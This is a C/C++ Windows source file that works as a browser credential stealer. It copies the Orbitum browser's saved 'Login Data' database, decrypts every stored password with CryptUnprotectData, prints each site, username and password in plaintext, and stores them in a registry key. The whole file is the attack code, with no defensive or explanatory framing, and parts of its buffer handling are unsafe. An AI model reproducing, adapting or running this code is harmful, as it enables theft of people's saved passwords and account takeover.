#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <Lmcons.h>
#include <winsqlite/winsqlite3.h>
#include <vector>
#include <string>

const char cFileL[] = "C:/Users/";
const char cFileR[] = "/AppData/Local/Orbitum/User Data/Default/Login Data";
const char cFileNew[] = "tmp";
const char cQuery[] = "select origin_url, username_value, password_value from logins";

typedef struct tuple {
    char origin_url[BUFSIZ]         = { 0 };
    char username_value[BUFSIZ]     = { 0 };
    char decrypted_password[BUFSIZ] = { 0 };
} tuple;

//void DecryptPassword(char* passData, char* password)
void DecryptPassword(DATA_BLOB* passData, char* password)
{
    DATA_BLOB DataOutput;
    if (!CryptUnprotectData(passData, NULL, NULL, NULL, NULL, 0, &DataOutput))
    {
        printf("CryptUnprotectData failed with error 0x%.8x\n", GetLastError());
        return;
    }
    memcpy(password, DataOutput.pbData, DataOutput.cbData);
    password[DataOutput.cbData] = '\0';
}

void WriteRegistry(std::vector<tuple>* vData)
{
    HKEY hKey;
    LPCTSTR sk = TEXT("SOFTWARE\\tov_1");
    LONG retval;
    
    retval = RegCreateKeyEx(
        HKEY_LOCAL_MACHINE,
        sk,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &hKey,
        NULL
    );
    if (retval != ERROR_SUCCESS)
    {
        printf("Error creating key\n");
        return;
    }

    for (std::vector<tuple>::iterator it = vData->begin(); it != vData->end(); it++)
    {
        std::string str = (*it).username_value;
        str += " ";
        str += (*it).decrypted_password;

        retval = RegSetValueEx(hKey, (*it).origin_url, 0, REG_SZ, (LPBYTE)str.c_str(), str.length() + 1);
        if (retval != ERROR_SUCCESS)
        {
            printf("Error writing to Registry.");
            continue;
        }
    }

    retval = RegCloseKey(hKey);
    if (retval != ERROR_SUCCESS)
    {
        printf("Error closing key.");
        return;
    }
}

void main()
{
    char cUsername[UNLEN + 1];
    char cFileFull[sizeof(cFileL) + sizeof(cFileR) + UNLEN + 1] = { 0 };
    DWORD username_len = UNLEN + 1;
    sqlite3* db;
    sqlite3_stmt* statementHandle;
    std::vector<tuple> obtainedData;
    int retval = 0;

    GetUserName(cUsername, &username_len);
    strcat_s(cFileFull, cFileL);
    strcat_s(cFileFull, cUsername);
    strcat_s(cFileFull, cFileR);

    CopyFile(
        cFileFull,
        cFileNew,
        FALSE
    );

    retval = sqlite3_open(
        cFileNew, 
        &db
    );

    if (retval != SQLITE_OK)
    {
        printf("Connection error. Off\n");
        exit(1);
    }
    
    retval = sqlite3_prepare_v2(
        db,
        cQuery,
        -1,
        &statementHandle,
        NULL
    );
    if (retval != SQLITE_OK)
    {
        printf("Query error. Off\n");
        sqlite3_close(db);
        exit(2);
    }

    while (sqlite3_step(statementHandle) == SQLITE_ROW)
    {
        tuple tmp;
        DATA_BLOB tmp_password_value;
        memcpy(tmp.origin_url, sqlite3_column_text(statementHandle, 0), BUFSIZ);
        memcpy(tmp.username_value, sqlite3_column_text(statementHandle, 1), BUFSIZ);

        tmp_password_value.pbData = (BYTE*)sqlite3_column_blob(statementHandle, 2);
        tmp_password_value.cbData = sqlite3_column_bytes(statementHandle, 2);
        DecryptPassword(&tmp_password_value, tmp.decrypted_password);

        obtainedData.push_back(tmp);
        printf("Website:  %s\nLogin:    %s\nPassword: %s\n\n",
            tmp.origin_url,
            tmp.username_value,
            tmp.decrypted_password);
    }

    WriteRegistry(&obtainedData);

    sqlite3_finalize(statementHandle);
    sqlite3_close(db);
    DeleteFile(cFileNew);
    system("pause");
}
